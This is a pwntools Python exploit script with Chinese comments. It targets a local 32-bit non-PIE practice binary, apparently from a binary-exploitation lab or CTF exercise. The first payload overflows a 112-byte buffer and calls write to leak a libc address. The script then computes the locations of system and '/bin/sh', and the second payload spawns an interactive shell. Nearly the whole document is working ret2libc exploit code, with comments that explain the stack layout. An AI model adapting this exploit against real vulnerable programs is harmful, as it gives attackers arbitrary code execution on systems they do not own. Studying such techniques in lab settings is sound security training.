from pwn import *

io = process('../target/nopie.out')

elf = ELF('../target/nopie.out')

libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# 反编译得知
vuln_func = 0x8049172

# 这边溢出return_address 变为write 返回地址变为vuln_func(write属于系统调用 返回地址就是将syscall的下一条指令入栈  
# 就是在当前rsp处，这里pop rip 后就是rsp 所以紧跟着write ) 然后继续溢出做write的arg 就是0:stdout wirte的got 然后写4字节
# 此处可以这么理解溢出后vuln返回实际做的操作pop localvar 然后pop rbp 恢复callers rbp但是此处应该是被污染了 然后pop rip 就是将write给了rip 
payload1 = b'A'*112+p32(elf.sym['write'])+p32(vuln_func)+p32(1)+p32(elf.got['write'])+p32(4)

io.send(payload1)

write_addr = u32(io.recv(8))
system_addr = write_addr-libc.sym['write']+libc.sym['system']
binsh_addr = write_addr-libc.sym['write']+next(libc.search('/bin/sh'))
payload2 = b'B'*112+p32(system_addr)+p32(vuln_func)+p32(binsh_addr)

io.send(payload2)
io.interactive()